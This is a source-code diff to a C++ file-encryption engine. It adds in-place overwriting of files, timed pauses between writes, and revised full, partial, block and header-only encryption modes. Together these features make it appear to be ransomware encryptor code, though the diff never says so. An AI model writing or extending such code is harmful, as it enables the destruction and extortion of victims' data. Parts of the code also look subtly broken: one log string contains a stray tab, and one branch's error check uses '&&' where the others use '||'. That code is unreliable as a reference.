@@ -7,6 +7,7 @@
 #endif
 
 
+#include <thread>
 #include <stdio.h>
 #include <string>
 #include <map>
@@ -22,6 +23,7 @@
 #include "CommandParser.h"
 
 #ifdef __linux__
+#define _FILE_OFFSET_BITS 64
 #include <sys/stat.h>
 
 #include <openssl/evp.h>
@@ -96,8 +98,9 @@ bool filesystem::getParseFile
 	}
 	FileInfo->Filesize = FileSize.QuadPart;
 #else
-	struct stat st;
-	if (fstat(FileInfo->FileHandle, &st) == -1)
+	struct stat64 st;
+
+	if (fstat64(FileInfo->FileHandle, &st) == -1)
 	{
 		LOG_ERROR("[GetParseFile] Failed fstat");
 		return FALSE;
@@ -192,6 +195,8 @@ bool filesystem::CreateFileOpen(DESC* desc_file, TCHAR* filename)
 static bool EncryptFileFullData(PFILE_INFO FileInfo)
 {
 	BOOL success = FALSE;
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	int written = 0;
 	DWORD BytesRead = FileInfo->Filesize;
 	size_t dwread = 0;
 	DWORD padding = 0;
@@ -223,11 +228,21 @@ static bool EncryptFileFullData(PFILE_INFO FileInfo)
 		BytesRead -= FileInfo->padding;
 	}
 
-	if (!filesystem::WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
+	if(GLOBAL_STATE.g_write_in &&
+		(!api::SetPointOff(FileInfo->newFileHandle, 0, SEEK_SET) &&
+		!api::WriteFile(FileInfo->newFileHandle, FileBuffer, BytesRead + padding, &written)))
+	{
+		LOG_ERROR("[EncryptFileFullData] failed;");
+		goto end;
+	}
+	else if (!filesystem::WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
 	{
 		LOG_ERROR("[EncryptFileFullData] File is failed to write; " log_str, FileInfo->Filename);
 		goto end;
 	}
+
+	if(sleep_time > 0)
+		std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
 
 	success = TRUE;
 end:
@@ -243,6 +258,9 @@ static bool EncryptFilePartly
 )
 {
 	BOOL success = FALSE;
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	int written = 0;
+	size_t total_write = 0;
 	DWORD multiply = 0;
 	size_t BytesRead;
 	size_t BytesReadW;
@@ -301,7 +319,17 @@ static bool EncryptFilePartly
 
 		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
 
-		if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
+		if(GLOBAL_STATE.g_write_in)
+		{
+			if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->newFileHandle, BufferPart, BytesRead, &written))
+				{
+					LOG_ERROR("[EncryptFilePartly] failed;");
+					goto end;
+				}
+			total_write += BytesRead;
+		}
+		else if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
 		{
 			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->FilePath);
 			goto end;
@@ -311,9 +339,19 @@ static bool EncryptFilePartly
 		{
 			if (!api::ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
 				break;
-			if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
+			if(GLOBAL_STATE.g_write_in)
+			{
+				if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->newFileHandle, BufferStep, BytesReadW, &written))
+					break;		
+			}
+			else if (!filesystem::WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
 				break;
 			TotalRead += BytesReadW;
+			total_write += BytesReadW;
+
+			if(sleep_time > 0)
+				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
 		}
 	}
 
@@ -334,7 +372,10 @@ static bool EncryptFileBlock
 )
 {
 	BOOL success = FALSE;
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
 	size_t BytesRead;
+	size_t total_write = 0;
+	int written = 0;
 	u32 padding = 0;
 	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE);
 
@@ -348,11 +389,24 @@ static bool EncryptFileBlock
 
 		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);
 
-		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
+		if(GLOBAL_STATE.g_write_in)
+		{
+			if(!api::SetPointOff(FileInfo->newFileHandle, total_write, SEEK_SET) || 
+				!api::WriteFile(FileInfo->newFileHandle, Buffer, BytesRead, &written))
+				{
+					LOG_ERROR("[EncryptFileBlock] failed;");
+					goto end;
+				}
+			total_write += written;
+		}
+		else if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
 		{
 			LOG_ERROR("[EncryptFileBlock] [WriteFullData] Failed");
 			goto end;
 		}
+
+		if(sleep_time > 0)
+			std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
 	}
 
 	success = TRUE;
@@ -373,6 +427,7 @@ static bool EncryptFileHeader
 	}
 
 	BOOL success = FALSE;
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
 	DWORD BytesEncrypt = 1048576;
 	size_t BytesRead;
 	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
@@ -381,32 +436,43 @@ static bool EncryptFileHeader
 		LOG_ERROR("Heap Crash");
 		return FALSE;
 	}
-	if (!api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead))
+	if (!api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) || BytesRead != BytesEncrypt)
 	{
 		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->Filename);
 		goto end;
 	}
 
-	if (BytesRead == 0)
-	{
-		LOG_ERROR("[EncryptFileHeader] Unexpected BytesRead");
-		goto end;
-	}
-
 	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
-
-	if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
+	
+	if(GLOBAL_STATE.g_write_in)
 	{
-		LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
-		goto end;
+		int written = 0;
+		if(!api::SetPoint(FileInfo->newFileHandle, SEEK_SET) || 
+			!api::WriteFile(FileInfo->newFileHandle, Buffer, BytesEncrypt, &written))
+			{
+				LOG_ERROR("[EncryptFileHeader] failed;");
+				goto end;
+			}
 	}
-
-	while (api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
+	else
 	{
-		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
+		if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
 		{
-			LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
+			LOG_ERROR("[EncryptFileH	eader] [WriteFullData] failed");
 			goto end;
+		}
+
+		while (api::ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
+		{
+			if (!filesystem::WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
+			{
+				LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
+				goto end;
+			}
+
+			if(sleep_time > 0)
+				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
+
 		}
 	}
 
